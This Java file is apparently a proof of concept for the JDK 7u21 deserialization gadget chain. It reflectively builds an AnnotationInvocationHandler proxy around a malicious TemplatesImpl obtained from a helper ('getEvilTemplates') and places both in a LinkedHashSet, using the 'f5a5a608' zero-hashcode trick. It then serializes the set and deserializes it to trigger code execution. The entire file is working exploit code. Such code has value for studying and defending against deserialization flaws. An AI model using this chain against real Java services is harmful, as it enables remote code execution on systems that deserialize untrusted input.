package TestJdk;

import com.sun.org.apache.xalan.internal.xsltc.compiler.Template;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import expUtils.ExpUtils;
import expUtils.ReflectUtils;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.annotation.Annotation;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Map;

public class Test7u21 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {
        System.out.println(System.getProperty("java.version"));

        String zeroHashCodeStr = "f5a5a608";
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor =  cls.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        HashMap hashMap = new HashMap();
        hashMap.put(zeroHashCodeStr,"foo");
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class,hashMap);

        TemplatesImpl templates = ExpUtils.getEvilTemplates();
        ReflectUtils.setFields(invocationHandler,"type",templates.getClass());
        Templates proxyH = (Templates) Proxy.newProxyInstance(Test7u21.class.getClassLoader(), templates.getClass().getInterfaces(),invocationHandler);


        LinkedHashSet linkedHashSet  = new LinkedHashSet();
        linkedHashSet.add(templates);
        linkedHashSet.add(proxyH);

        ReflectUtils.setFields(templates,"_auxClasses",null);
        ReflectUtils.setFields(templates,"_class",null);

        hashMap.put(zeroHashCodeStr, templates);

        String path = ExpUtils.serialize(linkedHashSet);
        ExpUtils.unserialize(path);

    }
}
